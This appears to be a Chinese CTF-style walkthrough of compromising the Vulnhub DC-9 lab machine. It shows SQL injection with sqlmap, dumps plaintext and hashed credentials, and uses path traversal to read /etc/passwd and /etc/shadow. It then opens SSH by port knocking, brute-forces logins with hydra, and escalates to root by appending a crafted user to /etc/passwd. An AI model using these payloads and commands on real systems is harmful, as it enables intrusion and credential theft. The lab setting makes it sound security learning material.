# Vulnhub DC-9 靶机实战

## 前言

最近看到同学在搞Vulnhub上的靶机，感觉很有意思，于是就自己试着下了个靶机整一整

相比于CTF线上赛题对某个或者某些知识点的考察，对靶机的渗透还是更综合和贴近实践的

整个过程可以说是一路遇坑（一开始虚拟网络NAT模式怎么都扫不到靶机。。。。最后直接无脑上桥接了）

不过也因此学到了很多工具的用法和一些fuzz技巧

![Screenshot_2020-01-15_17-15-44](C:\Users\Eki\Projects\ctf-notes\assets\images\Screenshot_2020-01-15_17-15-44.png)

## 渗透记录

首先用

```shell
arp-scan -l
```

扫一下靶机地址 返回

```shell
192.168.31.222  00:0c:29:3d:d1:6f       VMware, Inc.
```

然后nmap扫一下服务

```sehll
nmap -A 192.168.31.222
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-15 14:42 CST
Nmap scan report for 192.168.31.222
Host is up (0.00034s latency).
Not shown: 998 closed ports
PORT   STATE    SERVICE VERSION
22/tcp filtered ssh
80/tcp open     http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Example.com - Staff Details - Welcome
MAC Address: 00:0C:29:3D:D1:6F (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
```

发现有个http服务

登陆是个管理界面可以查询

![image-20200115151231167](C:\Users\Eki\Projects\ctf-notes\assets\images\image-20200115151231167.png)

1‘ or '1'='1返回所有记录，存在注入点

用sqlmap跑一跑

```shell
sqlmap -r post.txt -p search --dbs
[15:01:46] [INFO] fetching database names
available databases [3]:
[*] information_schema
[*] Staff
[*] users
```

先爆一下Users

只有一张表，表里的数据如下

```shell
Database: users
Table: UserDetails
[17 entries]
+----+------------+---------------+---------------------+-----------+-----------+
| id | lastname   | password      | reg_date            | username  | firstname |
+----+------------+---------------+---------------------+-----------+-----------+
| 1  | Moe        | 3kfs86sfd     | 2019-12-29 16:58:26 | marym     | Mary      |
| 2  | Dooley     | 468sfdfsd2    | 2019-12-29 16:58:26 | julied    | Julie     |
| 3  | Flintstone | 4sfd87sfd1    | 2019-12-29 16:58:26 | fredf     | Fred      |
| 4  | Rubble     | RocksOff      | 2019-12-29 16:58:26 | barneyr   | Barney    |
| 5  | Cat        | TC&TheBoyz    | 2019-12-29 16:58:26 | tomc      | Tom       |
| 6  | Mouse      | B8m#48sd      | 2019-12-29 16:58:26 | jerrym    | Jerry     |
| 7  | Flintstone | Pebbles       | 2019-12-29 16:58:26 | wilmaf    | Wilma     |
| 8  | Rubble     | BamBam01      | 2019-12-29 16:58:26 | bettyr    | Betty     |
| 9  | Bing       | UrAG0D!       | 2019-12-29 16:58:26 | chandlerb | Chandler  |
| 10 | Tribbiani  | Passw0rd      | 2019-12-29 16:58:26 | joeyt     | Joey      |
| 11 | Green      | yN72#dsd      | 2019-12-29 16:58:26 | rachelg   | Rachel    |
| 12 | Geller     | ILoveRachel   | 2019-12-29 16:58:26 | rossg     | Ross      |
| 13 | Geller     | 3248dsds7s    | 2019-12-29 16:58:26 | monicag   | Monica    |
| 14 | Buffay     | smellycats    | 2019-12-29 16:58:26 | phoebeb   | Phoebe    |
| 15 | McScoots   | YR3BVxxxw87   | 2019-12-29 16:58:26 | scoots    | Scooter   |
| 16 | Trump      | Ilovepeepee   | 2019-12-29 16:58:26 | janitor   | Donald    |
| 17 | Morrison   | Hawaii-Five-0 | 2019-12-29 16:58:28 | janitor2  | Scott     |
+----+------------+---------------+---------------------+-----------+-----------+
```

以为是管理页面的登录名和密码，但是试了一下发现不是。。。。。先放着

在Staff里发现了一条

```
Database: Staff
Table: Users
[1 entry]
+--------+----------------------------------+----------+
| UserID | Password                         | Username |
+--------+----------------------------------+----------+
| 1      | 856f5de590ef37314e7c3bdf6f8a66dc | admin    |
+--------+----------------------------------+----------+
```

反查md5发现是 transorbital1

登上去以后发现能Add Record

![image-20200115154745245](C:\Users\Eki\Projects\ctf-notes\assets\images\image-20200115154745245.png)

最下方居然有个File does not exist

提醒我们是不是存在本地文件包含漏洞

试一下加个file参数

```
http://192.168.31.222/addrecord.php?file=../../../../../../../etc/passwd
```

发现底部果然返回了文件内容

![image-20200115155021258](C:\Users\Eki\Projects\ctf-notes\assets\images\image-20200115155021258.png)

都加x了,没啥用

再读一下../../../../../../../etc/shadow

读不出来，（想也没有权限。。。。

接下去怎么办呢

我们前面看nmap的时候发现还存在ssh服务

但是处于filter状态，

怎么连上ssh呢

了解到knock这种东西

>knockd 监视一个预定义模式在iptables的日志,
>
>例如一次击中端口6356,一次击中端口63356,两次击中端口9356,
>
>这相当于敲一个关闭的门用一种特殊的暗码来被konckd识别,
>
>konckd 将使用iptables来打开一个预定义端口
>
>例如ssh的22端口在一个预定定义时间.(比如一分钟),如果一个ssh session 在这个时间范围内打开,这个端口会一直保留.直到预定义时间过期后ssh端口被knockd关掉.

可以读到其配置文件 ../../../../../../../etc/knockd.conf

```txt
[options] UseSyslog [openSSH] sequence = 7469,8475,9842 seq_timeout = 25 command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT tcpflags = syn [closeSSH] sequence = 9842,8475,7469 seq_timeout = 25 command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT tcpflags = syn 
```

所以我们只要这样就可以打开ssh了

```shell
root@kali:~# knock 192.168.31.222 7469 8475 9842 #对应sequence
root@kali:~# nmap -p22 192.168.31.222
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-15 16:09 CST
Nmap scan report for 192.168.31.222
Host is up (0.00031s latency).

PORT   STATE SERVICE
22/tcp open  ssh
MAC Address: 00:0C:29:3D:D1:6F (VMware)

Nmap done: 1 IP address (1 host up) scanned in 0.21 seconds
```

用什么来连呢，还记得前面泄露的那张表吗

我们可以用hydra跑一跑

将用户名和密码分别放在users.txt和passwd.txt里

跑出来

```shell
[22][ssh] host: 192.168.31.222   login: chandlerb   password: UrAG0D!                           
[22][ssh] host: 192.168.31.222   login: joeyt   password: Passw0rd                               
[22][ssh] host: 192.168.31.222   login: janitor   password: Ilovepeepee
```

然后就能连上ssh

joeyt和chandlerb的账号上都没有找到有意思的东西

在janitor的账户上找到了更多的密码

```
janitor@dc-9:~/.secrets-for-putin$ cat passwords-found-on-post-it-notes.txt 
BamBam01
Passw0rd
smellycats
P0Lic#10-4
B4-Tru3-001
4uGU5T-NiGHts
```

接着放进hydra里跑一跑

多了一条

```shell
[22][ssh] host: 192.168.31.222   login: fredf   password: B4-Tru3-001
```

常规sudo -l一下发现fredf可以执行一个程序

试一下执行

```
fredf@dc-9:~$ /opt/devstuff/dist/test/test
Usage: python test.py read append
```

还是先看一下源码吧

根据经验，源码应该放在/dist的父目录里

```python
fredf@dc-9:/opt/devstuff$ cat test.py
#!/usr/bin/python

import sys

if len (sys.argv) != 3 :
    print ("Usage: python test.py read append")
    sys.exit (1)

else :
    f = open(sys.argv[1], "r")
    output = (f.read())

    f = open(sys.argv[2], "a")
    f.write(output)
    f.close()
```

怎么利用这个脚本完成最后一步的提权呢？

注意到test执行的时候是有root权限的，

而这个程序又刚好可以让我们任意写

所有我们可以利用这个脚本往/etc/passwd里写一个管理员用户即可

先说说shadow文件中第二列的格式，它是加密后的密码，它有些玄机，不同的特殊字符表示特殊的意义：

> 1. 该列留空，即"::"，表示该用户没有密码。
> 2. 该列为"!"，即":!:"，表示该用户被锁，被锁将无法登陆，但是可能其他的登录方式是不受限制的，如ssh公钥认证的方式，su的方式。
> 3. 该列为""，即"::"，也表示该用户被锁，和"!“效果是一样的。
> 4. 该列以”!“或”!!“开头，则也表示该用户被锁。
> 5. 该列为”!!"，即":!!:"，表示该用户从来没设置过密码。
> 6. 如果格式为"\$id\$salt\$hashed"，则表示该用户密码正常。其中​\$id\$的id表示密码的加密算法，\$1\$表示使用MD5算法，\$2a\$表示使用Blowfish算法，"\$2y\$“是另一算法长度的Blowfish,”\$5\$“表示SHA-256算法，而”\$6\$"表示SHA-512算法，
>    目前基本上都使用sha-512算法的，但无论是md5还是sha-256都仍然支持。\$salt\$是加密时使用的salt，hashed才是真正的密码部分。

如下构造用户密码段

```shell
fredf@dc-9:/opt/devstuff/dist/test$ openssl passwd -1 -salt eki 123456
$1$eki$6AfXWsJC4WDuk9MwHsLDY.
```

```shell
eki:$1$eki$6AfXWsJC4WDuk9MwHsLDY.:0:0::/root:/bin/bash
```

/tmp目录可写 我们就写到tmp里好了

Exp：

```shell
echo 'eki:$1$eki$6AfXWsJC4WDuk9MwHsLDY.:0:0::/root:/bin/bash' >> /tmp/eki
sudo test /tmp/eki /etc/passwd
su eki
123456
```

然后就拿到theflag.txt啦！

### 参考资料

LFI fuzz：https://github.com/fuzzdb-project/fuzzdb/tree/master/attack/lfi

/etc/passwd的结构：https://blog.csdn.net/dearsq/article/details/52586320 

/etc/passwd 密码段的生成方式：https://blog.csdn.net/jiajiren11/article/details/80376371

